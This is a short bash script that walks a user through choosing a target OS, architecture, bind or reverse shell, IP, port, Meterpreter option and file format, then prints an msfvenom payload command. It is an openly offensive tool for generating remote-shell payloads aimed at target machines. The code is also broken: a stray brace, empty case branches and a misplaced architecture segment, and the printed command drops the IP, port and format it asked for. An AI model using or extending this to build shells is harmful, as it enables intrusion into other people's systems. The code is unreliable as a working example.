#!/bin/bash

echo "What is the operating system of your target? Example: windows, linux, osx"
read OS


echo "Is it 64 bit or 32? Please type 32 or 64."
read architecture


no_arc_display(){
case $OS in
        windows)
                arc=""
        ;;
esac
}


case $architecture in
	32)
		arc="/x86"
		no_arc_display
	;;

	64)
		arc="/x64"
}

	;;
esac



echo "Would you like to generate a bind shell or reverse shell? Please enter bind or reverse."
read shell

case $shell in
  reverse)
   	echo "Please enter your IP address."
        read ip
        echo "Please enter the port you would like to listen on."
        read port
    ;;
  bind)
        echo "Please enter your target's IP address."
	read ip
	echo "Please enter the remote port."
	read port
    ;;
esac


echo "Would you like to use meterpreter? Please indicate y for yes and n for no."
read meterpreter


echo "What would you like the file format to be? Example: exe, raw, pl, rb, c"
read format

payload=""
msfgen=""

use_meterpreter() {
case  $OS  in
        windows)
		msfgen="$payload/${shell}_tcp"
        ;;

        linux)
                msfgen="$payload/${shell}_tcp"
        ;;

        osx)
                msfgen="$payload/${shell}_tcp"
        ;;

        *)

esac
}


no_meterpreter() {
case  $OS  in
        windows)
                msfgen="$payload${shell}_tcp"
        ;;

        linux)
                msfgen="$payload${shell}_tcp"
        ;;

        osx)
                msfgen="$payload${shell}_tcp"
        ;;
        *)

esac
}

case  $meterpreter  in
	y)
	payload="$OS/meterpreter$arc"
	use_meterpreter
	echo "You will be creating a Meterpreter $shell shell payload for $architecture bit $OS in $format format."
        ;;
	n)
	payload="$OS$arc/shell_"
	no_meterpreter
	echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
        ;;
	*)
esac

echo "msfvenom -p $msfgen"
